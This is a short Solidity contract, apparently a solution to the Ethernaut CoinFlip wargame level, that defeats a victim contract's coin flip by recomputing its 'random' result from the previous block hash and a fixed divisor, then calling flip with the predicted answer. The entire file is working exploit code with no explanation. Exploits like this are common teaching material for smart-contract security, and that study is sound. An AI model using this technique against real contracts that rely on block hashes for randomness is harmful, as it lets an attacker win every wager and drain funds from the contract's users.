pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipAttacker {
    CoinFlip victim;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipInstanceAddress) {
        victim = CoinFlip(_coinFlipInstanceAddress);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        bool success = victim.flip(side);
        require(success, "Guess was incorrect");
    }
}
